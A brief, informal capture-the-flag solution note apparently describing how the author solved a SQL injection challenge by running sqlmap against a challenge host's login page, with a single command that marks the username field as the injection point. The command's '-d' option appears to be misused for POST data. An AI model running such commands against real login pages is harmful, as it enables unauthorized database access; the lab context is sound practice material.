To solved this i actually used sqlmap to solve it :)

sqlmap -u 'https://csean-seeql.chals.io/login' -d "username=*&password=anything"
